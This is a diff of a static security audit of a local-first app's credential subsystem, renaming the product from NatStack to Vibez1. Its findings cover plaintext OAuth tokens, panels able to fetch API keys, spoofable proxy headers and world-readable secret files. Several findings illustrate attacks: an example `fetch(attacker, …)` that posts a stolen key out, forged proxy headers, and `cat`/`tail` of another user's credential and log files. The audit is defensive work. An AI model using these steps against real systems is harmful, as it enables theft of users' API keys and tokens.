@@ -1,13 +1,13 @@
 # Audit 03 — Credentials & Secrets
 
-Branch: `audit` · Target: NatStack credential subsystem (wave 6–8 recent build)
+Branch: `audit` · Target: Vibez1 credential subsystem (wave 6–8 recent build)
 Auditor: read-only static review (no runtime exercise).
 
 ---
 
 ## Executive Summary
 
-NatStack now mediates OAuth / API credentials for Gmail, Calendar, GitHub,
+Vibez1 now mediates OAuth / API credentials for Gmail, Calendar, GitHub,
 Linear, OpenAI, Anthropic, etc. It is (correctly) single-user and local-first,
 so many of the "per-tenant" concerns that apply to multi-tenant SaaS do not.
 However, the implementation has a collection of concrete weaknesses that
@@ -18,15 +18,15 @@ The highest-severity issues are:
 
 | # | Severity | Issue |
 |---|----------|-------|
-| F-01 | **Critical** | `CredentialStore` writes OAuth access + refresh tokens as **plaintext JSON** under `~/.config/natstack/credentials/` — no OS keychain, no encryption-at-rest. |
+| F-01 | **Critical** | `CredentialStore` writes OAuth access + refresh tokens as **plaintext JSON** under `~/.config/vibez1/credentials/` — no OS keychain, no encryption-at-rest. |
 | F-02 | **Critical** | `authTokens.getProviderToken` allows **`panel` callers** to fetch raw OAuth / API keys for any configured AI provider (Anthropic, OpenAI, Google, …). Any panel the user opens can exfiltrate the user's API keys. |
-| F-03 | **Critical** | Egress proxy trusts `x-natstack-worker-id` / `x-natstack-proxy-auth` headers unconditionally — `PROXY_AUTH_TOKEN` is minted per worker but **never validated** on the proxy. Any process on `127.0.0.1` can attribute itself as any worker and have the proxy stamp `Authorization: Bearer <user-token>` onto requests to Gmail / GitHub / etc. |
+| F-03 | **Critical** | Egress proxy trusts `x-vibez1-worker-id` / `x-vibez1-proxy-auth` headers unconditionally — `PROXY_AUTH_TOKEN` is minted per worker but **never validated** on the proxy. Any process on `127.0.0.1` can attribute itself as any worker and have the proxy stamp `Authorization: Bearer <user-token>` onto requests to Gmail / GitHub / etc. |
 | F-04 | **High**    | `.secrets.yml` saved with default mode (usually `0o644`) via `saveSecretsToPath` — world-readable on most Linux/macOS systems. |
 | F-05 | **High**    | Egress proxy does not enforce `expiresAt` on credentials — expired access tokens are forwarded verbatim (depends on the refresh scheduler running and never missing deadlines). |
-| F-06 | **High**    | Third-party provider manifests (`@someone/natstack-provider-foo`) are trusted unconditionally — no signing, no allow-list — and control `apiBase` (→ which hosts get `Authorization: Bearer <user-token>` stamped) and `tokenUrl` (→ where the refresh-token is POSTed). |
+| F-06 | **High**    | Third-party provider manifests (`@someone/vibez1-provider-foo`) are trusted unconditionally — no signing, no allow-list — and control `apiBase` (→ which hosts get `Authorization: Bearer <user-token>` stamped) and `tokenUrl` (→ where the refresh-token is POSTed). |
 | F-07 | **High**    | Webhook relay (Cloudflare Worker) has **no HMAC / auth / verification** at all — receiving endpoint for provider webhooks is an open drop box. |
-| F-08 | **Medium**  | Full request URLs (with query strings) persisted to audit log (`~/.config/natstack/logs/credentials-audit-YYYY-MM-DD.jsonl`). Some provider APIs put auth codes / tokens / sensitive IDs in query strings. Log file created with default mode (not `0o600`). |
-| F-09 | **Medium**  | Panel bootstrap gateway caller token is persisted in `sessionStorage` (`__natstackPanelInit`) and exposed as `globalThis.__natstackGatewayToken` / `__natstackGatewayConfig` — any script in the panel's origin (incl. supply-chain-poisoned npm deps bundled into the panel) can read it. |
+| F-08 | **Medium**  | Full request URLs (with query strings) persisted to audit log (`~/.config/vibez1/logs/credentials-audit-YYYY-MM-DD.jsonl`). Some provider APIs put auth codes / tokens / sensitive IDs in query strings. Log file created with default mode (not `0o600`). |
+| F-09 | **Medium**  | Panel bootstrap gateway caller token is persisted in `sessionStorage` (`__vibez1PanelInit`) and exposed as `globalThis.__vibez1GatewayToken` / `__vibez1GatewayConfig` — any script in the panel's origin (incl. supply-chain-poisoned npm deps bundled into the panel) can read it. |
 | F-10 | **Medium**  | `remoteCredentialStore` falls back to **plaintext token on disk** when Electron `safeStorage` is unavailable (only emits a `log.warn`). Behaviour is silent from the user's perspective. |
 | F-11 | **Medium**  | `fetchPeerFingerprint` / `healthProbe` TOFU: first-time connect accepts the server-presented cert fingerprint under an "observedFingerprint" UX; but there is no pinning / UI friction enforced inside the daemon layer — relies entirely on the user visually comparing a 64-char hash. |
 | F-12 | **Medium**  | Mobile `PanelWebView` copies `panelInit` (which contains `gatewayConfig.token`) into `sessionStorage` inside the WebView. WebView sessionStorage isolation is per-origin; any JS the panel loads from a third-party script tag can read it. |
@@ -84,14 +84,14 @@ unlock user data on external SaaS — did not.
 **Exploitability.**
 
 1. Any other process running as the user can read
-   `~/.config/natstack/credentials/**/*.json` (on Linux/Mac) — no privileges needed.
+   `~/.config/vibez1/credentials/**/*.json` (on Linux/Mac) — no privileges needed.
 2. Backup tools (Time Machine, restic, Dropbox, Arq, cloud sync) with default
    include-rules will silently copy the tokens off the machine.
-3. Directory is under the standard central NatStack data directory
-   (`$XDG_CONFIG_HOME/natstack` or `~/.config/natstack` on Linux).
+3. Directory is under the standard central Vibez1 data directory
+   (`$XDG_CONFIG_HOME/vibez1` or `~/.config/vibez1` on Linux).
 4. Core dumps / process memory snapshots include the plaintext tokens after
    load.
-5. A `.config/natstack/` glob shared with a coworker (e.g. via a shared home
+5. A `.config/vibez1/` glob shared with a coworker (e.g. via a shared home
    directory on a dev box) leaks every connected integration.
 
 **Remediation.**
@@ -101,13 +101,13 @@ unlock user data on external SaaS — did not.
   `remoteCredentialStore.ts`). Persist ciphertext-as-base64 in the JSON.
 - In server-standalone mode (no Electron available), use a KEK derived from
   OS keychain (`keytar`) or fall back to an XDG-path AES-GCM file whose KEK
-  lives in `~/.config/natstack/.creds-kek` (0o600) so at least it is in a
+  lives in `~/.config/vibez1/.creds-kek` (0o600) so at least it is in a
   distinct file from the ciphertext.
 - Document in `credential-system.md` that non-Electron deployments without
   keychain support must opt in to a less-secure fallback; warn on startup.
 - Move the default base path under the OS-appropriate state directory
-  (macOS: `~/Library/Application Support/natstack/credentials`, Linux:
-  `$XDG_STATE_HOME/natstack/credentials`) alongside other state — the existing
+  (macOS: `~/Library/Application Support/vibez1/credentials`, Linux:
+  `$XDG_STATE_HOME/vibez1/credentials`) alongside other state — the existing
   `getCentralConfigDirectory()` helper already knows how.
 
 ---
@@ -140,13 +140,13 @@ rendered inside a ConsentDialog — can RPC `authTokens.getProviderToken`
 through the regular dispatch:
 
 ```js
-await natstackRpc.call("authTokens.getProviderToken", ["anthropic"]);
+await vibez1Rpc.call("authTokens.getProviderToken", ["anthropic"]);
 // → "sk-ant-api03-…"
 ```
 
 That key then exfiltrates to any origin via `fetch(attacker, {method:"POST", body: key})`.
 A single malicious / compromised panel vendor collects every API key of
-every NatStack user who installs the panel.
+every Vibez1 user who installs the panel.
 
 The comment in the source (`:272-274`) says "Workers fetch tokens for outbound
 API calls; panels list provider status" — that intent is correct, but the
@@ -180,8 +180,8 @@ sandbox; exposing them directly over `authTokens` RPC undoes it.
 **Snippet — egress proxy (server side):**
 ```ts
 // src/server/services/egressProxy.ts:21-22
-const WORKER_ID_HEADER = "x-natstack-worker-id";
-const PROXY_AUTH_HEADER = "x-natstack-proxy-auth";
+const WORKER_ID_HEADER = "x-vibez1-worker-id";
+const PROXY_AUTH_HEADER = "x-vibez1-proxy-auth";
 
 // :338-351 — the only call site that reads those headers
 private attributeRequest(req: IncomingMessage): RequestAttribution | null {
@@ -224,8 +224,8 @@ reach that IP), the attacker can:
 2. Send:
    ```
    GET https://api.github.com/user HTTP/1.1
-   X-Natstack-Worker-ID: my-chosen-worker-id
-   X-Natstack-Proxy-Auth: my-chosen-caller-id
+   X-vibez1-Worker-ID: my-chosen-worker-id
+   X-vibez1-Proxy-Auth: my-chosen-caller-id
    ```
 3. The proxy routes the request to the matching provider manifest
    (`github`), calls `consentStore.list(workerId)` — if the attacker picked
@@ -239,7 +239,7 @@ can simply wait, observe an audit entry, and replay.
 
 The *same* loopback `127.0.0.1` proxy design is exactly what NanoClaw /
 OpenClaw use, but those projects gate the proxy with a per-instance shared
-secret header. NatStack mints that secret and then forgets to check it.
+secret header. Vibez1 mints that secret and then forgets to check it.
 
 **Remediation.**
 
@@ -281,10 +281,10 @@ world-readable.
 Compare with `centralAuth.savePersistedAdminToken` which *does* use
 `{ mode: 0o600 }` and wraps the directory in `ensureCentralConfigDir()` (sets
 `0o700`). That pattern should be applied everywhere under
-`~/.config/natstack`.
+`~/.config/vibez1`.
 
 **Exploitability.** On a shared Unix system (dev boxes, build servers,
-containers with multiple UIDs), `cat ~targetuser/.config/natstack/.secrets.yml`
+containers with multiple UIDs), `cat ~targetuser/.config/vibez1/.secrets.yml`
 returns every API key the target has pasted in: Anthropic, OpenAI, Google,
 Groq, etc.
 
@@ -361,7 +361,7 @@ it means:
 
 `docs/credential-system.md:117-120`:
 > **Third-party providers as npm packages.** Anyone can publish
-> `@someone/natstack-provider-foo` with their own `client_id` and a
+> `@someone/vibez1-provider-foo` with their own `client_id` and a
 > manifest; users install it and it registers on startup.
 
 **Exploitability.** A malicious provider manifest can declare:
@@ -405,7 +405,7 @@ There is no:
 - Reject third-party registrations whose `apiBase` intersects a built-in
   manifest's `apiBase`.
 - Require operators to explicitly allow-list third-party provider IDs in
-  central config (`~/.config/natstack/config.yml` → `providers: [ ... ]`),
+  central config (`~/.config/vibez1/config.yml` → `providers: [ ... ]`),
   default deny.
 - Consider a minimal manifest-signing scheme: publisher's public key in a
   known location; manifest JSON + signature at install time.
@@ -474,7 +474,7 @@ async append(entry: AuditEntry): Promise<void> {
 
 **Exploitability.**
 
-1. Other users on the machine can `tail -f ~/.config/natstack/logs/credentials-audit-*.jsonl`
+1. Other users on the machine can `tail -f ~/.config/vibez1/logs/credentials-audit-*.jsonl`
    and watch the victim's API traffic in real time.
 2. Some third-party APIs put sensitive material in the URL: Google Calendar's
    `events.list?access_token=…` (legacy); OpenAI's older image URLs; any API
@@ -501,15 +501,15 @@ async append(entry: AuditEntry): Promise<void> {
 **File / Line:** `src/server/configLoader.ts:10-50`.
 
 ```js
-sessionStorage.setItem("__natstackPanelInit", JSON.stringify(cfg));   // :26
+sessionStorage.setItem("__vibez1PanelInit", JSON.stringify(cfg));   // :26
 ...
-globalThis.__natstackGatewayToken = cfg.gatewayConfig.token;
-globalThis.__natstackGatewayConfig = cfg.gatewayConfig;
+globalThis.__vibez1GatewayToken = cfg.gatewayConfig.token;
+globalThis.__vibez1GatewayConfig = cfg.gatewayConfig;
 ```
 
 The panel gateway caller token is:
 - Injected into the page global namespace. Any script on the page origin
-  reads it via `globalThis.__natstackGatewayToken`.
+  reads it via `globalThis.__vibez1GatewayToken`.
 - Persisted to `sessionStorage`. Any script can `sessionStorage.getItem(...)`
   it.
 
@@ -520,12 +520,12 @@ direct access to all AI provider credentials.
 
 **Exploitability.** Classic supply-chain surface. `ua-parser-js`-style
 incidents against a panel dep immediately become a credential-theft incident
-against NatStack users.
+against Vibez1 users.
 
 **Remediation.**
 
 - Keep the token in closure-scoped state inside a preload/isolated-world
-  script; wrap RPC calls through a narrow `window.natstack.rpc.call(...)`
+  script; wrap RPC calls through a narrow `window.vibez1.rpc.call(...)`
   that never exposes the token to the main-world globals.
 - Stop mirroring to `sessionStorage` (or mirror only a nonce that's bound to
   a short-lived server-side authenticator).
@@ -566,7 +566,7 @@ encrypted on this machine".
   returns false; surface a UI error with remediation instructions (install
   `libsecret`, unlock the keyring, etc.).
 - Or, encrypt with a machine-KEK derived from a file readable only by the
-  user (`~/.config/natstack/.kek`) as a better-than-plaintext fallback.
+  user (`~/.config/vibez1/.kek`) as a better-than-plaintext fallback.
 - Surface "encryption status" in the settings UI (`RemoteCredCurrent` → add
   `isEncrypted: boolean`).
 
@@ -611,9 +611,9 @@ caveats:
 **File / Line:** `apps/mobile/src/components/PanelWebView.tsx:102-107`.
 
 ```js
-globalThis.__natstackPanelInit = panelInit;
+globalThis.__vibez1PanelInit = panelInit;
 if (panelInit !== null) {
-  sessionStorage.setItem("__natstackPanelInit", JSON.stringify(panelInit));
+  sessionStorage.setItem("__vibez1PanelInit", JSON.stringify(panelInit));
 }
 ```
 
@@ -657,7 +657,7 @@ brute-force is infeasible. However:
 - The nonce travels through the redirect URL, into OS URL handlers / browser
   history / any OS-level accessibility audit log. Another local process
   (e.g. a panel that can read browser history, or a mobile app that
-  intercepts `natstack://oauth/callback`) can pick it up.
+  intercepts `vibez1://oauth/callback`) can pick it up.
 - `completeConsent` then stores the resulting `Credential` — including the
   long-lived refresh token — under a connection ID the attacker controls
   (`randomUUID` server-side — attacker can't pick it, but they can learn it
@@ -670,7 +670,7 @@ brute-force is infeasible. However:
   legitimate user didn't finish themselves.
 
 For a single-user local app this is mostly academic; with mobile universal
-links and custom URL schemes (F-05's `natstack://`), hijacking the URL scheme
+links and custom URL schemes (F-05's `vibez1://`), hijacking the URL scheme
 is a known Android/iOS attack class.
 
 **Remediation.**
@@ -896,5 +896,5 @@ is the standard to measure other secret-bearing files against.
   secret-handling code (contents are npm `node_modules` only).
 - `packages/browser-data/` — uses the documented Chromium / Firefox legacy
   crypto (`pbkdf2-sha1` @ 1 iter, fixed salt `saltysalt`). That is the
-  public spec for reading existing browsers' cookie stores, not NatStack's
+  public spec for reading existing browsers' cookie stores, not Vibez1's
   own crypto. Out of scope.
